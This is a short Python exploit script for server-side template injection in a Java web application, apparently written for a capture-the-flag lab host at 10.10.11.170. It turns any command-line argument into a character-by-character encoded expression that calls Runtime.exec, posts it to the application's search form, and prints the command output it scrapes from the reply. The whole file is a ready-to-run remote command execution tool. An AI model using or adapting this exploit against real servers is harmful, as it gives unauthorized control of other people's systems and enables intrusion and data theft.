import requests
import signal
import sys

from bs4 import BeautifulSoup

# ctrl + c (function)
def signal_handler(signum, frame):
    sys.exit('\n[!] Interrupted.')

signal.signal(signal.SIGINT, signal_handler)

# help panel
def help():
    print(f'\n[*] Use: python3 {sys.argv[0]} <command>')
    sys.exit()

# valid input
if len(sys.argv) != 2: help()

# variables
target = 'http://10.10.11.170:8080/search'
command = sys.argv[1]

# create payload (SSTI java)
def create_inyection(cmd):
    cmd_convertion = ''
    pos = 0
    for character in cmd:
        ascii_character = ord(character) # 97 = ord('a')
        java_convertion = f'T(java.lang.Character).toString({ascii_character})'
        # convertion by position (brackets)
        if pos == 0:
            cmd_convertion += java_convertion + '.concat('
        elif pos < len(cmd) - 1: 
            cmd_convertion += (java_convertion + ').concat(')
        else:
            cmd_convertion += (java_convertion + ')')
        pos += 1

    payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream())}' % cmd_convertion
    return payload

# make post request
def make_request():

    try:
        session = requests.Session()

        headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
        post_data = 'name=' + create_inyection(command)

        response = session.post(target, headers=headers, data=post_data)
        
        b_response = BeautifulSoup(response.text, 'lxml')
        output = b_response.find(class_='searched')
        
        print()
        print(output.string.replace('You searched for: ', ''))
    except Exception as e:
        sys.exit(f'[x] {e}')

if __name__ == '__main__':
    make_request()
